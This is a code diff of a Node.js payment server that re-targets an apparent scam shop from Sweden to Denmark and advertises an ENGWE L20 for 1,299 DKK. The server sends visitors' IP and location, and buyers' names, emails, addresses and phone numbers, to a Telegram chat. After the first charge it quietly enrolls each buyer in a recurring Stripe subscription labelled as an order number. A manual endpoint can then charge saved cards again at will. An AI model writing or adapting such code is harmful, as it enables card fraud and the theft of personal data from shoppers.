@@ -64,12 +64,12 @@ app.use(bodyParser.json());
 app.post('/page-visit', async (req, res) => {
   const { visitorId, ip, country, city } = req.body;
   await sendTelegram(
-    `👁 <b>Ny sidbesökare!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `🌍 Land: ${country || 'Okänt'}\n` +
-    `🏙 Stad: ${city || 'Okänt'}\n` +
-    `🔌 IP: ${ip || 'Okänt'}\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    `👁 <b>Ny sidbesøger!</b>\n\n` +
+    `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
+    `🌍 Land: ${country || 'Ukendt'}\n` +
+    `🏙 By: ${city || 'Ukendt'}\n` +
+    `🔌 IP: ${ip || 'Ukendt'}\n` +
+    `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
   );
   res.json({ ok: true });
 });
@@ -86,7 +86,7 @@ app.post('/create-setup-intent', async (req, res) => {
     } else {
       customer = await stripe.customers.create({
         email,
-        address: { country: 'SE' },
+        address: { country: 'DK' },
       });
     }
 
@@ -97,14 +97,15 @@ app.post('/create-setup-intent', async (req, res) => {
     });
 
     await sendTelegram(
-      `🛒 <b>Kassauppgifter!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `📧 E-post: ${email}\n` +
-      `👤 Namn: ${fname} ${lname}\n` +
-      `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
+      `🛒 <b>Kassaoplysninger!</b>\n\n` +
+      `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
+      `📧 E-mail: ${email}\n` +
+      `👤 Navn: ${fname} ${lname}\n` +
+      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
       `📞 Telefon: ${phone || 'N/A'}\n` +
-      `💰 Belopp: 1499 kr\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `📦 Produkt: ENGWE L20\n` +
+      `💰 Beløb: 1.299 DKK\n` +
+      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
     );
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
@@ -117,11 +118,11 @@ app.post('/create-setup-intent', async (req, res) => {
 app.post('/payment-initiated', async (req, res) => {
   const { visitorId, email } = req.body;
   await sendTelegram(
-    `💳 <b>Betalningsförsök startat!</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `📧 E-post: ${email}\n` +
-    `⏳ Kunden har klickat på "Betala nu"\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    `💳 <b>Betalingsforsøg startet!</b>\n\n` +
+    `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
+    `📧 E-mail: ${email}\n` +
+    `⏳ Kunden har klikket på "Køb nu"\n` +
+    `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
   );
   res.json({ ok: true });
 });
@@ -146,11 +147,11 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 9,94 EUR
+    // Charge 1 — 1.299 DKK (129900 cents)
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 994,
-        currency: 'eur',
+        amount: 129900,
+        currency: 'dkk',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -166,9 +167,10 @@ app.post('/create-subscription', async (req, res) => {
     await new Promise(resolve => setTimeout(resolve, 30000));
 
     // Subscription with 30-day trial
+    // NOTE: Update 'price_1TgtohD9m5cj7UNqiKNCDw94' to a DKK price ID from your Stripe dashboard
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1TgtohD9m5cj7UNqiKNCDw94' }],
+      items: [{ price: 'price_1UEU48BkfefkBB9Sicrm6Ong' }], // UPDATE THIS TO DKK PRICE
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -176,12 +178,13 @@ app.post('/create-subscription', async (req, res) => {
     console.log('Subscription created:', subscription.id, subscription.status);
 
     await sendTelegram(
-      `✅ <b>Betalning lyckades!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 9,94 eur\n` +
-      `🆔 Prenumeration: ${subscription.id}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `✅ <b>Betaling gennemført!</b>\n\n` +
+      `🆔 Besøger-ID: <code>${visitorId}</code>\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Betalingsmetode: ${pmType}\n` +
+      `💳 Beløb: 1.299 DKK\n` +
+      `🆔 Ordrenummer: ${subscription.id}\n` +
+      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
     );
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
@@ -199,7 +202,7 @@ app.get('/customers', (req, res) => {
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
 // POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 994, "currency": "eur" }
+// Body: { "customerId": "cus_xxx", "amount": 129900, "currency": "dkk" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
@@ -211,8 +214,8 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 994,
-      currency: currency || 'eur',
+      amount: amount || 129900,
+      currency: currency || 'dkk',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
       payment_method_types: [customer.pmType],
@@ -224,11 +227,12 @@ app.post('/charge-saved', async (req, res) => {
     console.log('Manual charge created:', payment.id, payment.status);
 
     await sendTelegram(
-      `💰 <b>Manuell betalning!</b>\n\n` +
-      `🆔 Kund: <code>${customerId}</code>\n` +
-      `💳 Belopp: ${(amount || 994) / 100} eur\n` +
+      `💰 <b>Manuel betaling!</b>\n\n` +
+      `🆔 Kunde: <code>${customerId}</code>\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Beløb: ${(amount || 129900) / 100} DKK\n` +
       `📋 Status: ${payment.status}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+      `🕐 Tid: ${new Date().toLocaleString('da-DK')}`
     );
 
     res.json({ success: true, paymentId: payment.id, status: payment.status });
@@ -244,6 +248,9 @@ app.get('/health', (req, res) => {
   res.json({
     status: 'ok',
     destination: ACCOUNT_B,
+    product: 'ENGWE L20',
+    amount: '1.299 DKK',
+    currency: 'dkk',
     savedCustomers: customers.length,
   });
 });
